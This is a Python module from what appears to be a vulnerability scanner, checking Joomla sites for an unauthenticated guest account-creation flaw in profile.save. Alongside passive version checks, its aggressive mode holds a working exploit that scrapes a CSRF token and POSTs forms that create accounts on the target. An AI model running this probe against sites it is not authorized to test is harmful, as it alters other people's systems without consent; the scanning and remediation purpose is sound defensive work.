from __future__ import annotations

import re
from typing import Any

from ...core.http import HttpClient, form_encode, is_transport_error, normalize_url, transport_error_detail
from ...core.models import Finding
from ...core.versions import parse_version_required, parse_version_safe
from . import gridbox_common as gb

CVE_ID = "CVE-2026-90907"
NAME = "Joomla core guest account creation via profile.save"
COMPONENT = "Joomla core com_users profile"
HAS_EXPLOIT = True
INTRUSIVE = True
EXPLOIT_MODES = ["aggressive"]
AFFECTED_JOOMLA_VERSIONS = ["1.5.0-5.4.8", "6.0.0-6.1.3"]
AFFECTED_RULE = "Joomla 1.5.0-5.4.8 and 6.0.0-6.1.3; guest profile.save creates a Guest-group user"
FIXED_RULE = "Update to Joomla 5.4.9, 6.1.4, or newer"
SAVE_PATH = "/index.php?option=com_users&task=profile.save"


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    if parsed is None:
        return "INCONCLUSIVE"
    if parse_version_required("1.5.0") <= parsed < parse_version_required("5.4.9"):
        return "LIKELY_VULNERABLE"
    if parse_version_required("6.0.0") <= parsed < parse_version_required("6.1.4"):
        return "LIKELY_VULNERABLE"
    if parsed < parse_version_required("1.5.0"):
        return "NOT_AFFECTED"
    return "PATCHED"


def passive_result(joomla_version: str | None) -> Finding:
    status = classify_version(joomla_version)
    confidence = "HIGH" if status in {"LIKELY_VULNERABLE", "PATCHED", "NOT_AFFECTED"} else "MEDIUM"
    details = {
        "LIKELY_VULNERABLE": (
            f"Joomla {joomla_version} does not check the login state in profile.save; a guest can "
            "submit the form and create a Guest-group account."
        ),
        "PATCHED": f"Joomla {joomla_version} rejects profile.save from a guest.",
        "NOT_AFFECTED": f"Joomla {joomla_version} predates the affected profile controller.",
        "INCONCLUSIVE": "Joomla was detected, but the core version could not be determined.",
    }
    return Finding(
        cve=CVE_ID, name=NAME, status=status, confidence=confidence,
        component=COMPONENT, component_version=joomla_version, affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT,
        detail=details[status],
        action="Upgrade to Joomla 5.4.9, 6.1.4, or newer and audit unexpected Guest-group accounts.",
    )


def _token(page: str) -> str | None:
    match = re.search(r'"csrf\.token":"([a-f0-9]{32})"', page)
    if match:
        return match.group(1)
    match = re.search(r'name="([a-f0-9]{32})" value="1"', page)
    return match.group(1) if match else None


def run_aggressive_probe(
    target_url: str,
    timeout: int = 12,
    proxy: str | None = None,
) -> Finding:
    base = normalize_url(target_url)
    client = HttpClient(timeout=timeout, proxy=proxy)
    preflight = client.get(f"{base}/", timeout=timeout)
    if is_transport_error(preflight):
        return Finding(
            cve=CVE_ID, name=NAME, status="ERROR", confidence="LOW",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True, proof_url=f"{base}/",
            detail=f"The target could not be reached ({transport_error_detail(preflight)}).",
            action="Retry when the target is reachable.",
        )
    token = _token(preflight.get("body", "") or "")
    if not token:
        return Finding(
            cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}{SAVE_PATH}",
            detail="No CSRF token was available on the home page.",
            action="Verify the site is reachable.",
        )
    username = "guest" + gb.random_suffix()
    password = gb.random_password()
    email = f"{username}@example.test"
    fields = {
        "jform[name]": "Guest Created",
        "jform[username]": username,
        "jform[email1]": email,
        "jform[password1]": password,
        "jform[password2]": password,
        "jform[id]": "0",
        token: "1",
    }
    save = client.request(
        f"{base}{SAVE_PATH}", method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=form_encode(fields), timeout=timeout, follow_redirects=False,
    )
    location = str((save.get("headers") or {}).get("Location") or "")
    match = re.search(r"user_id=(\d+)", location)
    created_id = int(match.group(1)) if match else 0
    # A duplicate submission is a second, independent existence oracle.
    duplicate = client.request(
        f"{base}{SAVE_PATH}", method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        data=form_encode({**fields, "jform[email1]": "dup" + email}), timeout=timeout,
        follow_redirects=False,
    )
    evidence: dict[str, object] = {
        "created_username": username,
        "save_status": save.get("status"),
        "redirect_user_id": created_id,
        "duplicate_status": duplicate.get("status"),
    }
    if save.get("status") == 303 and created_id > 0:
        return Finding(
            cve=CVE_ID, name=NAME, status="VULNERABLE", confidence="CONFIRMED",
            component=COMPONENT, affected_rule=AFFECTED_RULE,
            exploit_available=HAS_EXPLOIT, exploit_ran=True,
            proof_url=f"{base}{SAVE_PATH}",
            evidence=evidence,
            detail=(
                f"An unauthenticated POST to profile.save created user id {created_id} "
                f"({username}) with a password chosen by the requester, even though user "
                "registration is disabled. The account lands in the Guest group and cannot log in, "
                "but it exists and consumes the username/email."
            ),
            action=(
                "Upgrade to Joomla 5.4.9, 6.1.4, or newer (profile.save now rejects guests); "
                "remove unexpected Guest-group accounts."
            ),
        )
    return Finding(
        cve=CVE_ID, name=NAME, status="NOT_CONFIRMED", confidence="MEDIUM",
        component=COMPONENT, affected_rule=AFFECTED_RULE,
        exploit_available=HAS_EXPLOIT, exploit_ran=True,
        proof_url=f"{base}{SAVE_PATH}",
        evidence=evidence,
        detail=(
            "The guest profile.save did not return a created user id "
            f"(status={save.get('status')}, location={location[:80]!r}). "
            "A site with change_login_name disabled also blocks this specific path."
        ),
        action="Verify Joomla runs 5.4.9, 6.1.4, or newer.",
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    **kwargs: Any,
) -> Finding:
    result = passive_result(joomla_version)
    if not run_exploit_check:
        return result
    if exploit_mode != "aggressive":
        result.detail += " This CVE requires an aggressive lab-only guest profile.save proof."
        return result
    if result.status not in {"LIKELY_VULNERABLE", "INCONCLUSIVE"}:
        return result
    probe = run_aggressive_probe(target_url, timeout=timeout, proxy=proxy)
    probe.component_version = result.component_version
    return probe


def affects_joomla_version(joomla_version: str | None) -> bool:
    return True


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID, "cms": "joomla", "name": NAME, "component": COMPONENT,
        "affected_rule": AFFECTED_RULE, "affected_joomla_versions": AFFECTED_JOOMLA_VERSIONS,
        "exploit_available": HAS_EXPLOIT, "exploit_modes": EXPLOIT_MODES, "intrusive": INTRUSIVE,
        "vulnerability_type": "Authentication Bypass",
        "module_version": "1.0.0", "last_reviewed": "2026-11-12", "updated": "2026-11-12",
        "required_detectors": [],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2026-90907",
            "https://developer.joomla.org/security-centre/1082-20260902-core-unauthorized-user-account-creation-via-profile-save-controller.html",
        ],
    }
